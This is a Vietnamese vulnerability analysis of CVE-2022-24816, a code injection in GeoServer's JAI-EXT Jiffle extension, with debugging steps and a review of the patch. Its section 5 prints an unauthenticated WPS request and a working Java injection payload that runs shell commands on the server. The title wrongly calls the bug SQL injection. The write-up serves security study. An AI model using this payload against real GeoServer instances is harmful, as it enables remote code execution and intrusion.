# Phân tích CVE-2022-24816 - GeoServer SQL Injection

## 1. Giới thiệu GeoServer
GeoServer là một máy chủ mã nguồn mở với mục đích kết nối những thông tin địa lý có sẵn tới các WebGIS (trang web địa lý) sử dụng chuẩn mở.

GeoServer có thể đọc được nhiều định dạng dữ liệu, bao gồm PostGIS, Oracle
Spatital, ArcSDE, DB2, MySQL, Shapefile, GeoTIFF, GTOPO30 và nhiều loại
khác. Bên cạnh đó, GeoServer còn có thể chỉnh sửa dữ liệu nhờ những thành phần xử lý của chuẩn Web Feature Server.

GeoServer chủ yếu được xây dựng trên Spring Framework. Tuy nhiên, GeoServer cũng sử dụng một số thư viện và framework khác, bao gồm:

- **GeoTools**: Một thư viện Java mã nguồn mở cung cấp các công cụ cho dữ liệu không gian địa lý. GeoServer sử dụng GeoTools cho nhiều chức năng cốt lõi của nó, chẳng hạn như đọc, ghi và chuyển đổi dữ liệu.
- **Hibernate Validator**: Dùng để validate Java bean.
- **Apache Wicket**: Được sử dụng cho giao diện quản trị web. Đó là một web Framework dựa trên các thành phần tương tự như JavaServer Faces (JSF) và Tapestry.
- **Log4J**:  Dùng để hỗ trợ log.

## 2. Giới thiệu lỗ hổng CVE-2022-24816

GeoServer đi kèm với API JAI-EXT. API này được bật theo mặc định và cung cấp một tập hợp các đối tượng cấp cao để xử lý hình ảnh.  
Dự án JAI-EXT chứa một map algebra language (để nguyên bản vì dịch ra tiếng Việt khá tối nghĩa) được gọi là Jiffle. Jiffle là một ngôn ngữ kịch bản đơn giản để làm việc với raster image. Mục đích chính của nó là cho phép bạn làm được nhiều việc hơn với ít mã hơn.

Với CVSS 9.8 (Critical, theo NVD), đây được đánh giá là một lỗ hổng ở mức nghiêm trọng, việc khai thác thành công giúp kẻ tấn công có khả năng thực thi mã từ xa. Lỗ hổng chủ yếu đến từ việc inject Java code vào Jiffle script và thực thi ở server.

## 3. Các phiên bản tồn tại lỗ hổng CVE-2022-24816

Lỗ hổng này tồn tại trong các phiên bản JAI-EXT < 1.1.22.

## 4. Chuẩn bị môi trường debug

- GeoServer source: Ở đây mình dùng bản 2.17.2. Link: https://geoserver.org/announcements/2020/07/21/geoserver-2-17-2-released.html
- IDE: IntelliJ (bản Community hay Ultimate đều được).
- Cấu hình Run/Dubug Configurations theo hình bên dưới:

![enter image description here](https://imgur.com/GUq1jRP.png)

## 5. Phân tích lỗ hổng

Setup môi trường như mục bên trên, chạy debug trong IntelliJ. Mặc định GeoServer sẽ chạy ở port 8080 (ex. `http://localhost:8080/geoserver/`). 
Một số tổ hợp phím tắt khi debug trong IntelliJ:

 - Shift + Shift = tìm file theo tên.
 - Ctrl + F12 = tìm Method trong file.
 - Ctrl + Shift + F = tìm text từ mọi nơi.
 - F8 = Step Over - Nhảy đến dòng tiếp theo trong debug.
 - F9 = Resume Program - Bỏ qua các bước tiếp theo trong debug, return luôn cho client.
 - F7 = Step into - Nhảy vào method được thực thi trong luồng code đang chạy.
 - Shift + F8 = Step out - Ngược lại với step into, nhảy ra khỏi method đang được debug.

Theo tài liệu JAI-EXT Jiffle: "Jiffle scripts are turned on the fly into Java code which is then byte-code compiled into executable Java code" (tạm dịch: Các mã Jiffle được chuyển thành mã Java, sau đó được biên dịch thành byte-code và cuối cùng là được thực thi).

Quá trình thực thi Jiffle script như sau:

1. Compile Jiffle script thành runtime object.
2. Cung cấp runtime object với hình ảnh nguồn và đích cùng với có thể là thông tin tọa độ.
3. Thực thi đối tượng.
4. Trả về kết quả.

Điều quan trọng ở đây là hiểu được bước đầu tiên. Bước đầu tiên (Compile Jiffle script thành runtime object) được chia thành 4 phần nhỏ hơn:

- Tạo ra ParseTree từ Jiffle script.
- Tạo runtime model từ ParseTree.
- Convert từ runtime model thành Java source code.
- Compile Java source code thành byte-code.

Để trigger được lỗi này, đầu tiên cần tạo 1 XML request hợp lệ từ WPS Request builder (non-authenticated, trang chủ -> demos -> WPS request builder).

Điền các mục như hình, và click vào `Generate XML from process inputs/outputs`.

![enter image description here](https://imgur.com/UUqYrS9.png)

Mở project trong IntelliJ, đặt breakpoint vào it.geosolutions.jaiext.jiffleJiffle::createRuntimeSource.

![enter image description here](https://imgur.com/pw9EMRL.png)

Tạo POST request đến /geoserver/wms và gửi đoạn XML vừa gen ra vào body (non-authenticated).

```
POST /geoserver/wms HTTP/1.1
Host: localhost:8080
Content-Type: application/xml
[...]

<?xml version="1.0" encoding="UTF-8"?><wps:Execute version="1.0.0" service="WPS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.opengis.net/wps/1.0.0" xmlns:wfs="http://www.opengis.net/wfs" xmlns:wps="http://www.opengis.net/wps/1.0.0" xmlns:ows="http://www.opengis.net/ows/1.1" xmlns:gml="http://www.opengis.net/gml" xmlns:ogc="http://www.opengis.net/ogc" xmlns:wcs="http://www.opengis.net/wcs/1.1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xsi:schemaLocation="http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd">
  <ows:Identifier>ras:Jiffle</ows:Identifier>
  <wps:DataInputs>
    <wps:Input>
      <ows:Identifier>coverage</ows:Identifier>
      <wps:Data>
        <wps:ComplexData mimeType="application/arcgrid">
          <![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316 ]]>
        </wps:ComplexData>
      </wps:Data>
    </wps:Input>
    <wps:Input>
      <ows:Identifier>script</ows:Identifier>
      <wps:Data>
         <wps:LiteralData> asdasd = 1;</wps:LiteralData>
      </wps:Data>
    </wps:Input>
    <wps:Input>
      <ows:Identifier>outputType</ows:Identifier>
      <wps:Data>
        <wps:LiteralData>DOUBLE</wps:LiteralData>
      </wps:Data>
    </wps:Input>
  </wps:DataInputs>
  <wps:ResponseForm>
    <wps:RawDataOutput mimeType="image/tiff">
      <ows:Identifier>result</ows:Identifier>
    </wps:RawDataOutput>
  </wps:ResponseForm>
</wps:Execute>
```

Sau khi gửi request, ta thấy trình debugger nhảy đến breakpoint vừa đặt. Phương thức createRuntimeSource là nơi convert runtime model (đã được tạo ra trước đó) thành Java source code. F8 đến dòng `scriptModel.write(writer);`. Ở đây gọi đến it.geosolutions.jaiext.jiffle.parser.node.Script::write để thực hiện convert runtime model thành Java source code. F7 để nhảy vào phương thức write.

![enter image description here](https://imgur.com/hQ6Pxmo.png)

Ở đây, từng dòng code Java được thêm append vào biến w, đoạn script (từ input) cũng được append vào bên trong `<code>` và `</code>` như Java docs. F8 đến cuối phương thức, theo dõi giá trị biến w (dạng text):

![enter image description here](https://imgur.com/RJSnXtO.png)

Ta thấy dòng `asdasd = 1;` lấy từ input được thêm vào hoàn chỉnh. Vậy ý tưởng ở đây là có thể kiểm soát đoạn script thì có khả năng chèn Java code vào. Nhìn vào đoạn Java docs trên hình, để chèn được Java code, ta cần escape dấu comment `/**` và `*/`. Payload sẽ có dạng `asdasd = 1; // */ INJECTED JAVA CODE HERE /*`. 

Vì đoạn injected code được nằm ngoài class chính (class `JiffleIndirectRuntimeImpl`), ta cần tìm cách để code bên trong class chính trigger được đoạn injected code mới có thể RCE. Nhìn vào đoạn `double result = Double.NaN;` nằm trong class JiffleIndirectRuntimeImpl được tạo ở bước "Convert từ runtime model thành Java source code".

![enter image description here](https://imgur.com/Yax2EjR.png)

Theo Java Docs:

> A class or interface type T will be initialized immediately before the first occurrence of any one of the following: [...] A static field declared by T is assigned. **[JAVA-CLASS-INITIALIZATION]**

Hiểu đơn giản là một class kiểu T sẽ được khởi tạo (load vào memory) ngay trước khi một trường static được định nghĩa bởi T được gán. Một điều nữa, khi một trường static của class được truy cập, static blocks của class sẽ được thực thi. 
Vậy ý tưởng ở đây là override class Double, khai báo static field `NaN`, khai báo static blocks chứa code cần thực thi. Khi thực thi class JiffleIndirectRuntimeImpl đến đoạn `double result = Double.NaN`, đoạn code trong static blocks sẽ được thực thi. Ta có thể kiểm soát output bằng cách throw RuntimeException.

Class Double cần được đưa vào payload có dạng như sau:

```
class Double {
	public static double NaN = 0;
		static {
    try {
      java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("ls -la").getInputStream()));
      String line = null;
      String allLines = " - ";
      while ((line = reader.readLine()) != null) {
        allLines += line + "\n";
      } throw new RuntimeException(allLines);
    } catch (java.io.IOException e) {}
  }
}
```

Payload:

```
<wps:LiteralData> 
	asdasd = 1; // */ class Double {    public static double NaN;  static { try {  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("ls -la").getInputStream())); String line = null; String allLines = " - "; while ((line = reader.readLine()) != null) { allLines += line + "\n"; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /*
</wps:LiteralData>
```

Code Java của class được tạo (khi đã inject malicious code) sẽ có dạng như sau:

![enter image description here](https://imgur.com/IFZHX0N.png)

Output của request chứa output của command được thực thi:

![enter image description here](https://imgur.com/AEjUzcd.png)

## 6. Vá lỗ hổng

Nhìn qua commit cb1d6565d38954676b0a366da4f965fef38da1cb với message "_Validate Jiffle input variable names according to grammar, escape Javadocs when including Jiffle sources in output_" của JAI-EXT trên github qua [link](https://github.com/geosolutions-it/jai-ext/commit/cb1d6565d38954676b0a366da4f965fef38da1cb#), dễ thấy lỗ hổng được vá bằng việc validate input bằng regex và escape ký tự `/` với HTML encode.

![enter image description here](https://www.synacktiv.com/sites/default/files/inline-images/patch_diff_0.png)

## 7. Nguồn tham khảo

https://www.synacktiv.com/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver

https://nvd.nist.gov/vuln/detail/CVE-2022-24816
